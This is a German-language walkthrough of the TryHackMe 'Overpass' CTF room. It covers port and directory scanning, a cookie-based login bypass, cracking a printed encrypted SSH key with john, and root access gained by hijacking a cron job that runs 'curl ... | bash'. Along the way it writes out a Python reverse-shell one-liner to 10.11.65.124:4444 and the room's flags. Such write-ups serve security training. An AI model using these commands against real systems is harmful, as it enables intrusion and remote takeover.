# Overpass 1 CTF tryhackme.com
> Link zur CTF: [tryhackme.com](https://tryhackme.com/room/overpass)

Als erstes Scannen wir die IP-Adresse nach offene Ports um uns ein überblick zu verschaffen:<br>

* Command: `nmap -sV -A -oN scan.txt <TARGET-IP>`<br>

### Nmap Scan Result:
```
# Nmap 7.94SVN scan initiated Sun Feb 18 22:26:31 2024 as: nmap -sV -A -oN scan.txt 10.10.129.208
Nmap scan report for 10.10.129.208
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 18 22:26:48 2024 -- 1 IP address (1 host up) scanned in 16.27 seconds
```

es sind also 2 Ports offen. SSH ist nicht angreifbar, aber http ist interesant also konzentrieren wir uns auf port 80.
Als erstes Scannen wir die website nach verzeichnisse und bruteforcen diese:<br>

* Command: `gobsuter dir http://10.10.197.218/ /usr/share/wordlists/dirb/command.txt`<br>

### Gobuster Result:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.197.218/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]

===============================================================
Finished
===============================================================
```
Ein interesantes gibt es bei dem ergebnis: **/admin** sieht wie eine Login-Page aus.<br>

### /admin page:
![Admin anmelde Seite](./admin_page.png)

nach dem ich einmal zum test **username=admin&password=admin** ausprobiert habe habe ich mit dem Browser-Tools von Mozilla Firefox sehen können das eine .js Datei angesprochen wird namens: **login.js** wenn wir uns diesen code mal ansehen finden wir folgende interesante funktion:<br>

* login.js:
  ```javascript
    async function login() {
      const usernameBox = document.querySelector("#username");
      const passwordBox = document.querySelector("#password");
      const loginStatus = document.querySelector("#loginStatus");
      loginStatus.textContent = ""
      const creds = { username: usernameBox.value, password: passwordBox.value }
      const response = await postData("/api/login", creds)
      const statusOrCookie = await response.text()
      if (statusOrCookie === "Incorrect credentials") {
          loginStatus.textContent = "Incorrect Credentials"
          passwordBox.value=""
      } else {
          Cookies.set("SessionToken",statusOrCookie)
          window.location = "/admin"
      }
    }
  ```
in diesem code gibt es eine sicherheits lücke die in einem echten Senario ziemlich fatal währe,<br>der Fehler liegt in: `(statusOrCookie === "Incorrect credentials")` Man könnte einfach sein Cookie auf `"statusOrCookie"` setzen über die Browser-Console<br>

* Command: `Cookies.set("SessionToken","statusOrCookie")` <br>

und die Seite neuladen und dadruch das login umgehen, und ich bin drin!<br>

### Seiten Inhalt:
```
Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```
Auf der seite finden wir eine nachricht an den User: **James** und einen verschlüsselten **id_rsa** key für den fall das er sein Password vergisst. Anscheinend ist diese Function im Code eine art Backdoor für den Entwickler aber leider nicht personalisiert genung und zu offensichtlich.
<br>
Also speichern wir uns diesen Key auf unseren system in einer datei. Aber wir müssen sie noch entschlüsseln<br>
<br>
dafür benutze ich: `ssh2john`
* Command: `ssh2john id_rsa > hash`<br>
<br>
Jetzt führen ich einen Hash Brute Force angriff aus:<br>
<br>

* Command: `john hash --wordlist=/usr/share/wordlists/rockyou.txt`

  ### John Result:
  ```
  id_rsa:james13

  1 password hash cracked, 0 left
  ```
  <br>  
* Command: `chmod 600 id_rsa`<br>
  <br>
  
jetzt haben wir auch den schlüssel um uns auf denn SSH Server einzuloggen.<br>
Nun loggen wir uns ein mit: `ssh james@IP -id id_rsa` auf dem Server ein,<br>
geben das Password ein für die id_rsa datei: **james13** und wir sind drin!<br>
<br>

### SSH Server:
![SSH Server login](./login_ssh.png)

* User Flag: `thm{65c1aaf000506e56996822c6281e6bf7}`<br>
<br>
Nach dem ich auf dem System **linpeas** ausführe und das systeam nach PrivEsc möglichkeiten scannen finde ich in der **/etc/crontab** file eine Aufgabe die jede Minute ausgeführt wird:<br>
`* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash`<br>
Erklärung:
* Argument 1: `* * * * *` bedeutet dass das die Aufgabe jede Minute ausgeführt wird<br>
* Argument 2: `root` bedeutet das es mit root rechten ausgeführt wird<br>
* Argument 3: `curl overpass.thm/downloads/src/buildscript.sh | bash` ist das was ausgeführt wird

Das ist interesant es wird eine curl abfrage an overpass.thm/downloads/src/buildscript.sh gestellt und die Aufgabe wird automatisch ausgeführt. Was ich noch durch linpeas sehen konnte ist das die **/etc/hosts** bearbeitet werden kann, also könenn wir der domain overpass.thm einfach mit unsere IP-Addresse wechseln und erstellt auf unseren System einfach ein **/downloads/src** Ordner und das **buildscript.sh** mit einer rshell.<br>
<br>
ich entscheide mich für:
`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.65.124",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
<br>

## buildscript.sh content:
```bash
#!/bin/sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.65.124",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
Als nächstes starte ich ein python3 http.server auf dem port 80 da der target server immer den port 80 abfragt, wichtig ist den server in dem Ordner vor /downloads zu starten und gleichzeitig einen rshell listener zu starten in meinem fall:<br>
<br>
* Command: `nc -lnvp 4444`<br>
<br>
Jetzt heißt es warten bis der Target Server das Script downloaded und ausführt, und ich hab eine root shell<br>

![root access terminal](./root_access.png)

* Root Flag: `thm{7f336f8c359dbac18d54fdd64ea753bb}`


